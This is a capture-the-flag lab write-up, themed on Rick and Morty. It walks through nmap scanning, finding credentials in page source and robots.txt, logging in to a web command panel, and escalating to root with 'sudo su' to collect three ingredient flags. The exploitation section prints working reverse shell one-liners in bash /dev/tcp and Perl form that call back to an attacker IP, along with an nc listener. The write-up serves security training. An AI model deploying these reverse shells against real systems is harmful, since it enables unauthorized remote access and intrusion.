Description:

This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

Scenario:

We've been given  the IP address of the victim host  ex 255.255.255.255

## Step 1: Scanning

Using nmap i run the following command  

```bash
nmap -p- --open -sS -sV xxx.xxx.xxx.xxx
#this command may take some times to load, it's advicevle to exclude -n and -Pn 
#to don't resolve the DNS 
```

Where:

-p-  : scann all port

—open: show only the open ports

-sS : SYN scan is the default and most popular scan option for good reasons. It can be performed quickly, scanning thousands of ports per second on a fast network not hampered by restrictive firewalls. It is also relatively unobtrusive and stealthy since it never completes TCP connections.

-sV: Version detection

### Discovers

We discovered 2 open ports:

| Ports | STATE | SERVICE | VERSION |
| --- | --- | --- | --- |
| 22/TCP | open | ssh | Open SSH 2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux: protocolo2.0) |
| 80/TCP | open | http | Apache httpd 2.4.18 ((Ubunutu)) |

# Enumeration

Analysis Port 22/TCP

A

### **Analysis Port 80/TCP**

The port 80 redirect to a Web server, therefore i paste  on the browser url the IP adrres of the victim machine.

It directs  to a website 

****

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5a1f2ac4-10bc-40f6-b279-26528e8ca325/Untitled.png)

Opening the source code i notice the following comment

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a668633a-41bf-486b-9fe6-d21d1f7f80ee/Untitled.png)

We found a Username: **R1ckRul3s**

Now i want to enumerate the possible exsisting direct associated with that web server

I use the command

```bash
nmap -sV --script=http-enum <target>
```

-sV: Version detection

--script: Runs a script scan using the comma-separated list of filenames, script categories, and directories.

### Discovers

We found two directories:

```bash
/login.php
/robots.txt
```

Browsing to /login.php , we are redirect to a log in page :

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2cc435b8-98c2-4a31-a765-4ed3bf419ef2/Untitled.png)

Browsing to /robots.txt , we are redirect to a html page with this word (We assume it's the passowrd):

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/764766a5-6642-47fa-bc16-76487e4cf2f0/Untitled.png)

Credential :

Username: **R1ckRul3s**

Password: xxxxxxxxxxx

# Gaining privileges

We go back to {IP}/login.phop  and i use as Username: **R1ckRul3s and as** Password: xxxxxxxxxxx

We can successfully log in: 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c5cc2faf-1fb8-46e7-988a-43de3d52ec71/Untitled.png)

We're presente with a command pannel:

Running the command 

```bash
ls
```

we can see all the above showed assets , trying to 

```bash
cat
```

these file, will results in 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/23064ade-f915-459b-91d5-010f9b8c40ec/Untitled.png)

# Expolitation

We need to use a shell, in order to gain privileges in the victimes envirolment:

As main resources i used [https://ironhackers.es/en/herramientas/reverse-shell-cheat-sheet/](https://ironhackers.es/en/herramientas/reverse-shell-cheat-sheet/)

1st attempt:

****Reverse Shell- Bash shell****

Following the documentation on the Attacker machine i opened the port 8080 to listen

```bash
nc -lvp 8080
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/557467c1-42c4-4413-b59b-425c731a7a52/Untitled.png)

On the Victim machine i run the  command:

```bash
bash -i >& /dev/tcp/xx.xx.xx.xx/8080 0>&1
```

## Nothin happen, Test failed

2ndAttempt

****Reverse Shell- Perl shell****

Following the documentation on the Attacker machine i opened the port 8080 to listen

```bash
nc -lvp 1234
```

On the Victim machine i run the  command:

```bash
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

We gain access to the machine:

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/df773578-cceb-4bb0-81aa-5ec70742539b/Untitled.png)

Browsing the file system , now we can 

```bash
cat "Sup3rS3cretPickl3Ingred.txt"
```

### The First ingredients is : mr meeseek hair

When i 

```bash
pwd
```

it return 

```bash
pwd
var/www/html
```

The current user is :  www-data

going back in the folder hierarchy i go to 

```bash
/home
```

I can see:

```bash
rick 
ubunutu
```

I want to explore rick folder:

```bash
cd /home/rick
```

we found the second ingredients is Jerry Tear

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f8be9229-9436-4f9c-a0c1-f03a818f97c7/Untitled.png)

At this point i want to access the root folder and gain full privileges.

I tried with 

```bash
sudo su 
```

Luckly it work, by acceding the root folder 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6a48134a-1a8b-4992-a10f-57381559a96e/Untitled.png)

In the /root folder wel'’find the 3rd ingredient :

```bash
cat 3rd.txt
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3dced013-95e7-4aca-b82b-929c7885cc14/Untitled.png)

The 3rd ingredients is fleeb Juice
